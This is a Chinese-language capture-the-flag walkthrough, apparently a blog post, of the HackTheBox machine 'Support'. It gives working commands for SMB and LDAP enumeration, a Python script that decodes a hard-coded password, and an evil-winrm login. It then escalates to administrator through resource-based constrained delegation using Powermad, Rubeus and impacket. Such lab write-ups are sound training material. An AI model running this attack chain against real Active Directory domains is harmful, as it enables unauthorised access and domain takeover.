![在这里插入图片描述](https://img-blog.csdnimg.cn/ac48fabbc32c41b9b83084b39d053bf8.png)

网址：
```
https://app.hackthebox.com/machines/Support
```
# 枚举
使用nmap扫描ip
```
nmap -sC -sV -p- 10.10.11.174
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/c503bb55c8b94e788b2f80f22c019207.png)
## dns枚举

并且还扫描到了域名，现在用dig工具对DNS服务器进行枚举
```
dig @10.10.11.174 +short support.htb any
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/43e2f68a859b405c960d0e65cc02c23e.png)

服务器的计算机名是dc，域名为support.htb，我们将此域名解析到本地
```
vim /etc/hosts
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/6a617fc2557741bd9c745c576f62753f.png)
然后保存退出
## smb枚举
根据nmap获取的内容，这台机子还开启了smb服务，我们对smb进行枚举
```
smbclient -L \\10.10.11.174   
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/ab19345d5aa14a43befba14921554bbb.png)

这台机子的smb服务共享了一个叫support-tools的目录，我们进去看看
```
smbclient -N //10.10.11.174/support-tools

```
![在这里插入图片描述](https://img-blog.csdnimg.cn/858f6c6db26d47d2a871b31f2cd3d54a.png)

里面有很多文件，我们将里面文件都下载到本地
```
mask ""
recurse ON
prompt OFF
mget *
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/b27a9f33810440549471b62f9e7c7443.png)

在本地目录里可以看到这些下载的文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/75d1f72a672741fabe19c1f71a0c6db1.png)

其中，这个userinfo可能是突破点，文件名表明了和机子用户相关的信息，我们将其解压
```
unzip UserInfo.exe.zip 
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/8d15b30bfb4b4c4585c596270f288e00.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/91ec960826054edf8bb697feee924ca1.png)


这是一个32位的程序，并且还是一个.NET文件，我们用dnspy进行逆向分析
# 逆向分析
dnspy工具下载地址:
```
https://github.com/dnSpy/dnSpy
```
然后用32位的dnspy打开32位的程序


![在这里插入图片描述](https://img-blog.csdnimg.cn/ac37d4ee121f43bfbad59f076ffd4b8d.png)

在这里，程序执行了LDAP查询，我们双击这个getpassword进入函数分析

![在这里插入图片描述](https://img-blog.csdnimg.cn/077f89f28090401a987729cc16cac6b6.png)

密钥在进行了base64加密后进行了简单的异或运算，我们写一个python脚本来还原凭证

```
import base64
 
enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key = "armando".encode("UTF-8")
 
array = base64.b64decode(enc_password)
array2 = ""
 
for i in range(len(array)):
    array2 += chr(array[i] ^ key[i % len(key)] ^ 223)
 
print(array2)
```
运行脚本，获得凭证

![在这里插入图片描述](https://img-blog.csdnimg.cn/ccaf4d3f7f7d4448b9421f0c151d0e43.png)
# 获取用户权限
## LDAP枚举
什么是LDAP协议：
```
https://zhuanlan.zhihu.com/p/147768058
```

通过刚刚的逆向分析，机子开启了LDAP协议，现在我们用刚刚生成的凭证来枚举信息
```
ldapsearch -x -H ldap://dc.support.htb -D 'SUPPORT\ldap' -w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -b "CN=Users,DC=SUPPORT,DC=HTB" | tee ldap_dc.support.htb.txt
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/21e562d524414cacb4724b4350c72c55.png)



![在这里插入图片描述](https://img-blog.csdnimg.cn/d007f957c9934fbc9b4905702eda687a.png)

在这里可以看到用户账户的详细信息，通常来说info字段都是空的，这可能是用户的密码


然后用evil-winrm连接机子
```
evil-winrm -i 10.10.11.174 -u "support" -p 'Ironside47pleasure40Watchful'
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/74f823b1688c4110a8d9dbf0d1eaf928.png)

成功获取机子的用户权限

![在这里插入图片描述](https://img-blog.csdnimg.cn/bb78fd306ebb4c63803f9e0e41ba6ef2.png)
# 提权
## 信息搜集
现在我们可以访问DC服务器的命令行，需要枚举AD权限和错误配置的文件
工具：
```
https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe
```
上传文件
```
upload SharpHound.exe
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/87fbb8fc11b9422db49cc6ed522b09ed.png)

运行程序搜集服务器AD数据
```
./SharpHound.exe --memcache -c all -d SUPPORT.HTB -DomainController 127.0.0.1
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/7bffa6dcadfc490e930f610202f27163.png)
将这个zip文件下载到本地
```
download 20221022060134_BloodHound.zip
```
然后下载配套的分析工具，将这个zip文件导入进去
```
apt-get install bloodhound
neo4j console 
```
然后访问
```
http://localhost:7474/browser/
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/c229c6f7212a4c458e10bb671115f9d1.png)

账号和密码都是neo4j

![在这里插入图片描述](https://img-blog.csdnimg.cn/6a4a20680e784673befcf437424507c3.png)

连接上之后需要重新设置密码

![在这里插入图片描述](https://img-blog.csdnimg.cn/372d05207c1e4d0c8fba32426152fa95.png)

设置好后在终端输入bloodhound启动工具，账号和密码是刚刚设置的那些

![在这里插入图片描述](https://img-blog.csdnimg.cn/b9c0b57f8c80445cb02574205f2378ac.png)

点击登录后拖入刚刚从机子上下载的zip文件

![在这里插入图片描述](https://img-blog.csdnimg.cn/d068c2c8880a485cbb8c17e835b10880.png)


如果导入后没有显示，就重新启动一下程序

![在这里插入图片描述](https://img-blog.csdnimg.cn/f77afed7b6534989b29a4f7197a05de0.png)


点击Shortest Path to Unconstrained Delegation Systems后，我们能发现很多东西


![在这里插入图片描述](https://img-blog.csdnimg.cn/f5643482f4994c7dbd3f9146a7180ece.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/c023cae04c6a476992b07a113dfd484c.png)

"SHARED SUPPORT ACCOUNTS@SUPPORT.HTB"组对“DC.SUPPORT.HTB”具有“GenericAll”权限，我们可以访问的support用户是“SHARED SUPPORT ACCOUNTS@SUPPORT.HTB”组的成员，因此，我们给其他对象授予“DC.SUPPORT.HTB”的“GenericAll”权限，可以利用这个方法来提权

## 票证伪造
下载这两个ps脚本，然后上传到机子上
```
https://github.com/PowerShellEmpire/PowerTools/blob/master/PowerView/powerview.ps1
https://github.com/Kevin-Robertson/Powermad/blob/master/Powermad.ps1
https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
```
上传文件和导入模块：
```
upload powerview.ps1
Import-Module .\powerview.ps1
upload Powermad.ps1
Import-Module .\Powermad.ps1
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/3cdf36c8c1544a3ea1af54347ce315dd.png)

然后设置变量
```
Set-Variable -Name "FakePC" -Value "FAKE01"
Set-Variable -Name "targetComputer" -Value "DC"
```

然后将新的计算机对象添加到AD
```
New-MachineAccount -MachineAccount (Get-Variable -Name "FakePC").Value -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
```

使用内置的AD模块，给我们生成的计算机对象设置权限
```
Set-ADComputer (Get-Variable -Name "targetComputer").Value -PrincipalsAllowedToDelegateToAccount ((Get-Variable -Name "FakePC").Value + '$')
Get-ADComputer (Get-Variable -Name "targetComputer").Value -Properties PrincipalsAllowedToDelegateToAccount
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/a0b0493e43e147ab81ff912de26d54bf.png)



将Rubeus程序上传到机子里，然后生成一个rc4的哈希值，之后票证伪造有用
```
upload Rubeus.exe
.\Rubeus.exe hash /password:123456 /user:FAKE01$ /domain:support.htb
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/19659fb27f5147f2a450990bf71f7ba0.png)


## 使用票证
现在下载一些工具来使用这个票证
```
https://github.com/SecureAuthCorp/impacket/tree/master/examples
pip3 install impacket==0.9.24
pip3 install pyasn1
sudo apt install krb5-user
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/a3f205f5d08442cdb8c32c9ecd724d4d.png)

然后设置kali上的环境变量和删除之前使用过的票证
```
getST.py support.htb/FAKE01 -dc-ip dc.support.htb -impersonate administrator -spn http/dc.support.htb -aesKey 35CE465C01BC1577DE3410452165E5244779C17B64E6D89459C1EC3C8DAA362B
kdestroy
export KRB5CCNAME=ticket.ccache
```
![在这里插入图片描述](https://img-blog.csdnimg.cn/3f3b035b80b8492f86434c5a0b5be573.png)



都设置好后我们还需要在本地解析靶机的dns域名，由于我们之前就解析过，这里就不用再演示了

![在这里插入图片描述](https://img-blog.csdnimg.cn/81abca2abd924429a497dd437eeb9821.png)


```
impacket-wmiexec support.htb/administrator@dc.support.htb -no-pass -k
```
获得机子最高权限

![在这里插入图片描述](https://img-blog.csdnimg.cn/0042dab24ca54306836a12bb7aec9d20.png)

![在这里插入图片描述](https://img-blog.csdnimg.cn/12679e30724b48aca31357e4ac01c3fe.png)

